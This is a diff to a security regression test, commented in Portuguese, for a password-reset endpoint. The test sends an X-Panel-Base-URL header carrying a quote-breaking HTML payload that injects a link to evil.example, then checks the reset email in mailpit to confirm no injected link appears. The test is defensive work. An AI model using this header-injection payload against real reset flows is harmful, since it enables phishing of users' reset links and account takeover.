@@ -79,21 +79,34 @@ describe("security - X-Panel-Base-URL allowlist (phishing-via-header)", () => {
     );
   });
 
-  it("aceite: header com origin allowlistado é respeitado", async () => {
-    // Igual a "panel chamando API a partir de localhost:3400" → header aceite.
+  it("attack: origin allowlistado com aspas no path NÃO injeta link no email", async () => {
+    // O helper devolvia o header inteiro e o template não escapava o href:
+    // a aspa fechava o atributo e o botão passava a apontar para fora.
     const res = await fetch(`${BASE_URL}/v1/auth/forgot-password`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
-        "X-Panel-Base-URL": "http://localhost:3400/extra/path?ignored=1",
+        "X-Panel-Base-URL": 'http://localhost:3400/"></a><a href="https://evil.example/c?x=',
       },
       body: JSON.stringify({ identifier: victimEmail }),
     });
     assertEquals(res.status === 200 || res.status === 204, true);
     await res.body?.cancel();
-    // Não validamos o body aqui - basta saber que a request foi aceite e
-    // não quebrou. O "extra/path" é preservado pelo helper porque o origin
-    // bate com a allowlist.
+    await new Promise((r) => setTimeout(r, 300));
+
+    const mp = await fetch(`http://localhost:8025/api/v1/messages?limit=5`);
+    const list = await mp.json() as {
+      messages: Array<{ ID: string; To: Array<{ Address: string }>; Subject: string }>;
+    };
+    const recent = list.messages.find((m) =>
+      m.To.some((t) => t.Address === victimEmail) && m.Subject.includes("Reset")
+    );
+    assertNotEquals(recent, undefined, "email de reset não chegou ao mailpit");
+    const bodyRes = await fetch(`http://localhost:8025/api/v1/message/${recent!.ID}`);
+    const body = await bodyRes.json() as { Text?: string; HTML?: string };
+    const fullBody = (body.Text ?? "") + " " + (body.HTML ?? "");
+    assertEquals(fullBody.includes("evil.example"), false, "link injetado no email de reset");
+    assertEquals(fullBody.includes("http://localhost:3400/reset-password?token="), true);
   });
 
   it("cleanup", async () => {
